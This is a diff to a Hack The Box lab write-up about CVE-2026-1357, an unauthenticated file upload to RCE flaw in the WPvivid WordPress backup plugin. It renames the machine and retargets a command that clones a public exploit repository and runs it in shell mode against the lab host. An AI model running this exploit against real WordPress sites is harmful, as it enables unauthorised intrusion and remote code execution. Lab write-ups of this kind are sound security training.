@@ -1,7 +1,7 @@
 # Machine
 Future Machine On HTB
 
-# Write-up — "CorpPanel" (Easy)
+# Write-up — "InterestCorp" (Easy)
 
 **Vulnerabilidad base:** CVE-2026-1357 — WPvivid Backup & Migration (WordPress) ≤ 0.9.123
 Unauthenticated Arbitrary File Upload → RCE (CVSS 9.8)
@@ -76,7 +76,7 @@ git clone https://github.com/halilkirazkaya/CVE-2026-1357
 cd CVE-2026-1357
 pip install -r requirements.txt
 
-python3 exploit.py --target http://10.10.10.X --mode shell
+python3 exploit.py --target http://interest.htb --mode shell
 ```
 
 El exploit:
